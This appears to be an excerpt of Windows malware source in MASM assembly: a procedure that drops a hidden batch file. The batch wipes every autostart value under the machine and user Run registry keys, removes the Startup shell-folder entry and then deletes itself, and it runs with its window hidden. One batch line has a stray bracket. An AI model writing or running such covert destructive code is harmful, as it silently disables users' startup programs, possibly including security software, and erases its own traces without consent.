        .data
                szBatchFile     db "REG DELETE HKLM\Software\Microsoft\Windows\CurrentVersion\Run /va /f",13,10,"REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /va /f",13,10,"[REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders /v Startup /f",13,10,"del %0",0
                szBatchName     db "a.bat",0
        
        .code

delAutor proc
        LOCAL   hFile: DWORD
        LOCAL   bWritten: DWORD
                
        invoke  GetModuleFileName, NULL, offset lpBuf2, MAX_PATH
        invoke  lstrcpy, offset lpBuf1, offset lpBuf2

        lea     eax, lpBuf2
        xor     edx, edx
@loop:
        cmp     byte ptr[eax], '\'
        jne     @next
        mov     edx, eax
@next:
        inc     eax
        cmp     byte ptr[eax], 0
        jnz     @loop

        inc     edx
        mov     byte ptr[edx], 0
        invoke  lstrcat, offset lpBuf2, offset szBatchName

        ; Write batch file into created file
        invoke  CreateFile, offset lpBuf2, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @end

        invoke  lstrlen, offset szBatchFile
        mov     edx, eax
        invoke  WriteFile, hFile, offset szBatchFile, edx, addr bWritten, NULL
        invoke  CloseHandle, hFile

        szText  SelfDelQuoteFmt, '"%s"'
        invoke  wsprintf, offset lpBuf3, addr SelfDelQuoteFmt, offset lpBuf1

        ; Execute batch file
        xor     eax, eax
        push    SW_HIDE
        push    eax
        push    offset lpBuf3
        push    offset lpBuf2
        push    offset szTextOpen
        push    eax
        call    ShellExecute
@end:
        ret
delAutor endp